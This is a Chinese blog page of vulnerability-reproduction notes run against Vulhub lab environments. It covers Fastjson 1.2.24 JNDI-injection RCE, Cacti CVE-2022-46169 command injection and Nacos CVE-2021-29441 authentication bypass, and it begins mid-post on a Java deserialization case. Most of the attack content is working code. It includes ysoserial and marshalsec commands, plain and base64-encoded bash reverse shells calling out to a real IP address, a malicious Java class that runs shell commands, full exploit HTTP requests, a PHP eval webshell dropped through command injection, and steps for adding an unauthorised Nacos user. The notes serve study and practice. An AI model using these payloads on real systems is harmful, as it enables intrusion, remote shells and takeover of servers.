<p>进入docker，命令<code>touch /tmp/awesome_poc</code>执行成功：</p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905154826790.png" alt="image-20230905154826790"></p>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/123.56.181.14/4444 0&gt;&amp;1</span><br><span class="line"># base64编码</span><br><span class="line">YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuNTYuMTgxLjE0LzQ0NDQgMD4mMQ==</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar ysoserial-master-2874a69f61-1.jar CommonsCollections6 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuNTYuMTgxLjE0LzQ0NDQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; shell.poc</span><br><span class="line">$ curl -XPOST --data-binary @shell.poc http://123.56.181.14:8080/org.vulhub.api.CalcService</span><br></pre></td></tr></table></figure>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905160303151.png" alt="image-20230905160303151"></p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905155920271.png" alt="image-20230905155920271"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2023/09/05/Fastjson 1.2.24 反序列化导致任意命令执行漏洞/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="biobby">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/header.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Su.">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2023/09/05/Fastjson 1.2.24 反序列化导致任意命令执行漏洞/" itemprop="url">Fastjson 1.2.24 反序列化导致任意命令执行漏洞</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2023-09-05T14:00:50+08:00">
                2023-09-05
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/漏洞复现/" itemprop="url" rel="index">
                    <span itemprop="name">漏洞复现</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          
		  
		  

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="Fastjson-1-2-24-反序列化导致任意命令执行漏洞"><a href="#Fastjson-1-2-24-反序列化导致任意命令执行漏洞" class="headerlink" title="Fastjson 1.2.24 反序列化导致任意命令执行漏洞"></a>Fastjson 1.2.24 反序列化导致任意命令执行漏洞</h1><p>Fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p>
<blockquote>
<p>Fastjson 是一个功能强大、高性能的 JSON 处理库，适用于各种 Java 应用程序，并提供了简便的 API 来处理 JSON 数据。无论是简单的序列化和反序列化，还是复杂的数据转换和处理，Fastjson 都是一个值得考虑的选择</p>
</blockquote>
<p>参考资料：</p>
<ul>
<li><a href="https://www.freebuf.com/vuls/208339.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/208339.html</a></li>
<li><a href="">[http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/](](http://xxlegend.com/2017/04/29/title- fastjson 远程反序列化poc的构造和分析/</a><a href="http://xxlegend.com/2017/04/29/title-" target="_blank" rel="noopener">http://xxlegend.com/2017/04/29/title-</a> fastjson 远程反序列化poc的构造和分析/)</li>
</ul>
<p>fastjson标识</p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905192524794.png" alt="image-20230905192524794" style="zoom:50%;"></p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>Vulhub运行测试环境：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub-master/fastjson/1.2.24-rce/</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p>环境运行后，访问<code>http://your-ip:8090</code>即可看到JSON格式的输出。</p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905192058005.png" alt="image-20230905192058005" style="zoom:50%;"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>因为目标环境是Java 8u102，没有<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的限制，我们可以使用<code>com.sun.rowset.JdbcRowSetImpl</code>的利用链，借助JNDI注入来执行命令。</p>
<p>首先编译并上传命令执行代码，如<code>http://evil.com/TouchFile.class</code>：</p>
<p>1.执行<code>javac TouchFile.java</code>，生成<code>TouchFile.class</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// javac TouchFile.java</span><br><span class="line">#TouchFile.java内容如下</span><br><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class TouchFile &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;&quot;touch&quot;, &quot;/tmp/success&quot;&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            // do nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905193227159.png" alt="image-20230905193227159"></p>
<p>2.通过python搭建一个临时的web服务，该服务是为了接收LDAP服务重定向请求，需要在payload的目录下开启此web服务，这样才可以访问到payload文件。此处payload文件即<code>TouchFile.class</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 8888</span><br></pre></td></tr></table></figure>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905193816969.png" alt="image-20230905193816969" style="zoom:67%;"></p>
<p>3.借助<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec</a>项目，启动一个RMI服务器，监听9999端口，并制定加载远程类<code>TouchFile.class</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://123.56.181.14:8888/#TouchFile&quot; 9999</span><br></pre></td></tr></table></figure>
<p>再开一个窗口，连接vps，执行命令</p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905194335821.png" alt="image-20230905194335821"></p>
<p>4.向靶场服务器发送Payload，带上RMI的地址，注意Content-Type应该是<code>application/json</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 123.56.181.14:8090</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 167</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://123.56.181.14:9999/TouchFile&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905195720430.png" alt="image-20230905195720430" style="zoom:50%;"></p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905195823125.png" alt="image-20230905195823125" style="zoom:50%;"></p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905195921933.png" alt="image-20230905195921933">返回到容器内，命令<code>touch /tmp/success</code>已成功执行：</p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905201013455.png" alt="image-20230905201013455"></p>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>同样，执行<code>javac TouchFile.java</code>，生成<code>TouchFile.class</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// javac TouchFile.java</span><br><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class TouchFile &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/192.168.174.128/9999;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            // do nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也可以使用bash base64的方式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String[] commands = &#123;&quot;bash&quot;, &quot;-c&quot;,&quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuNTYuMTgxLjE0LzQ0NDQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905201438758.png" alt="image-20230905201438758"></p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905201522736.png" alt="image-20230905201522736"></p>
<p>启动一个RMI服务器，监听9999端口，并制定加载远程类<code>TouchFile.class</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://123.56.181.14:8888/#TouchFile&quot; 9999</span><br></pre></td></tr></table></figure>
<p>发送POST请求包，因监听端口未发生变化，所以请求包内容与上方一致</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 123.56.181.14:8090</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 167</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://123.56.181.14:9999/TouchFile&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发送请求包之前，攻击机监听4444端口：</p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905202030449.png" alt="image-20230905202030449"></p>
<p>发送请求包，同时发生如下</p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905202115815.png" alt="image-20230905202115815"></p>
<p>反弹成功</p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905202431865.png" alt="image-20230905202431865"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2023/07/19/Cacti 前台命令注入漏洞（CVE-2022-46169）/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="biobby">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/header.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Su.">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2023/07/19/Cacti 前台命令注入漏洞（CVE-2022-46169）/" itemprop="url">Cacti 前台命令注入漏洞（CVE-2022-46169）</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2023-07-19T20:00:43+08:00">
                2023-07-19
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/漏洞复现/" itemprop="url" rel="index">
                    <span itemprop="name">漏洞复现</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          
		  
		  

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="Cacti-前台命令注入漏洞（CVE-2022-46169）"><a href="#Cacti-前台命令注入漏洞（CVE-2022-46169）" class="headerlink" title="Cacti 前台命令注入漏洞（CVE-2022-46169）"></a>Cacti 前台命令注入漏洞（CVE-2022-46169）</h1><p>Cacti是一个服务器监控与管理平台。在其1.2.17-1.2.22版本中存在一处命令注入漏洞，攻击者可以通过X-Forwarded-For请求头绕过服务端校验并在其中执行任意命令。</p>
<blockquote>
<p>Cacti是一款用于网络监控和图形化展示的开源软件。它基于PHP和MySQL构建，提供了丰富的功能和易于使用的界面，可以帮助管理员监控网络设备、服务器、应用程序等的性能指标并进行可视化展示。</p>
<p>以下是Cacti的主要特点：</p>
<ol>
<li>图形化展示：Cacti可以通过轻松配置的方式，收集并绘制各种设备和应用程序的性能数据。它提供了丰富的图表类型和自定义选项，可以根据需求创建仪表盘、历史记录图和趋势图等。</li>
<li>数据收集和存储：Cacti支持使用SNMP、SSH、WMI等协议来收集设备的性能数据，并将这些数据存储在数据库中。它还提供了数据聚合和压缩功能，以减少存储空间的占用。</li>
<li>自动化图表生成：Cacti具有自动化图表生成功能，可以根据预先定义的模板和设备配置，自动生成图表。这样可以大大简化配置和管理工作，提高效率。</li>
<li>告警和通知：Cacti可以设置监控阈值，并在达到或超过阈值时触发告警。它支持多种告警方式，如电子邮件、短信、SNMP Trap等，可以及时通知管理员进行故障排查和问题解决。</li>
<li>插件和扩展性：Cacti提供了丰富的插件和扩展接口，使用户可以根据自己的需求来扩展和定制功能。这样可以将Cacti与其他系统集成，或是添加新的数据源和图表类型。</li>
</ol>
</blockquote>
<p>执行如下命令启动一个Cacti 1.2.22版本服务器：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
<p>环境启动后，访问<code>http://your-ip:8080</code>会跳转到登录页面。使用admin/admin作为账号密码登录，并根据页面中的提示进行初始化。</p>
<p>实际上初始化的过程就是不断点击“下一步”，直到安装成功：</p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904163830731.png" alt="image-20230904163830731"></p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904164032019.png" alt="image-20230904164032019"></p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904165024135.png" alt="image-20230904165024135"></p>
<p>这个漏洞的利用需要Cacti应用中至少存在一个类似是<code>POLLER_ACTION_SCRIPT_PHP</code>的采集器。所以，我们在Cacti后台首页创建一个新的Graph：</p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904165343918.png" alt="image-20230904165343918"></p>
<p>选择的Graph Type是“Device - Uptime”，点击创建：</p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904165506334.png" alt="image-20230904165506334"></p>
<p>完成上述初始化后，我们切换到攻击者的角色。作为攻击者，发送如下数据包：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /remote_agent.php?action=polldata&amp;local_data_ids[0]=6&amp;host_id=1&amp;poller_id=`touch+/tmp/success` HTTP/1.1</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Host: 123.56.181.14:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://123.56.181.14:8080/index.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 2</span><br></pre></td></tr></table></figure>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904190746183.png" alt="image-20230904190746183"></p>
<p>虽然响应包里没有回显，但是进入容器中即可发现<code>/tmp/success</code>已成功被创建：</p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904191128715.png" alt="image-20230904191128715"></p>
<h3 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /remote_agent.php?action=polldata&amp;local_data_ids[0]=6&amp;host_id=1&amp;poller_id=`echo+&apos;&lt;?php+phpinfo();?&gt;&apos;&gt;/var/www/html/test.php` HTTP/1.1</span><br></pre></td></tr></table></figure>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904191902625.png" alt="image-20230904191902625"></p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904192010205.png" alt="image-20230904192010205"></p>
<h3 id="写入蚁剑webshell"><a href="#写入蚁剑webshell" class="headerlink" title="写入蚁剑webshell"></a>写入蚁剑webshell</h3><p>一句话木马</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#&lt;?php @eval($_POST[&apos;attack&apos;]);?&gt; </span><br><span class="line">GET /remote_agent.php?action=polldata&amp;local_data_ids[0]=6&amp;host_id=1&amp;poller_id=`echo+&apos;&lt;?php+@eval($_POST[&apos;attack&apos;]);?&gt;&apos;&gt;/var/www/html/test.php` HTTP/1.1</span><br></pre></td></tr></table></figure>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904192517120.png" alt="image-20230904192517120"></p>
<p>蚁剑连接</p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904192543523.png" alt="image-20230904192543523"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2023/03/01/Nacos 认证绕过漏洞（CVE-2021-29441）/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="biobby">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/header.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Su.">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2023/03/01/Nacos 认证绕过漏洞（CVE-2021-29441）/" itemprop="url">Nacos 认证绕过漏洞（CVE-2021-29441）</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2023-03-01T21:00:01+08:00">
                2023-03-01
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/漏洞复现/" itemprop="url" rel="index">
                    <span itemprop="name">漏洞复现</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          
		  
		  

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="Nacos-认证绕过漏洞（CVE-2021-29441）"><a href="#Nacos-认证绕过漏洞（CVE-2021-29441）" class="headerlink" title="Nacos 认证绕过漏洞（CVE-2021-29441）"></a>Nacos 认证绕过漏洞（CVE-2021-29441）</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Nacos 是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。致力于帮助发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，可以快速实现动态服务发现、服务配置、服务元数据及流量管理。</p>
<p>该漏洞发生在nacos在进行认证授权操作时，会判断请求的user-agent是否为”Nacos-Server”，如果是的话则不进行任何认证。开发者原意是用来处理一些服务端对服务端的请求。但是由于配置的过于简单，并且将协商好的user-agent设置为Nacos-Server，直接硬编码在了代码里，导致了漏洞的出现。并且利用这个未授权漏洞，攻击者可以获取到用户名密码等敏感信息。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://github.com/advisories/GHSA-36hp-jr8h-556f" target="_blank" rel="noopener">https://github.com/advisories/GHSA-36hp-jr8h-556f</a></li>
</ul>
<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>运行漏洞环境：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
<p>环境运行后，会开放3306、8848、9848、9555端口，在本次漏洞利用中，我们只需要用到8848端口，即web访问端口。<strong>执行漏洞验证过程时，请先访问8848端口，确认开放，某些情况下nacos服务会启动失败（无法连接数据库导致），可以重启nacos服务或者重启所有服务</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose restart nacos</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用脚本"><a href="#漏洞利用脚本" class="headerlink" title="漏洞利用脚本"></a>漏洞利用脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python poc.py http://target:8848</span><br></pre></td></tr></table></figure>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞利用过程如下：</p>
<ol>
<li>修改User-Agent的值为Nacos-Server到请求包中</li>
<li>访问<code>http://target:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9</code>查看状态码是否为200，且内容中是否包含<code>pageItems</code></li>
<li>使用POST方式访问<code>http://target:8848/nacos/v1/auth/users?username=vulhub&amp;password=vulhub</code>添加一个新用户</li>
<li>访问<code>http://target:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9</code>获取已有的用户列表</li>
<li>访问<code>http://target:8848/nacos/</code>，使用添加的新用户(vulhub/vulhub)进行登录</li>
</ol>
<p><strong>检测漏洞是否存在</strong></p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230913194923866.png" alt="image-20230913194923866"></p>
<p>添加Header头后访问<code>http://target:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9</code>可以看到返回值为200，且内容中是否包含<code>pageItems</code>。</p>
<p><strong>添加新用户</strong></p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230913195048825.png" alt="image-20230913195048825"></p>
<p>添加Header头后使用<strong>POST</strong>方式请求<code>http://target:8848/nacos/v1/auth/users?username=vulhub&amp;password=vulhub</code>添加一个新用户,账号密码都为vulhub</p>
<p><strong>使用新建的账号进行登录</strong></p>
<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230913195139890.png" alt="image-20230913195139890"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2023/02/11/Metabase任意文件读取漏洞（CVE-2021-41277）/">

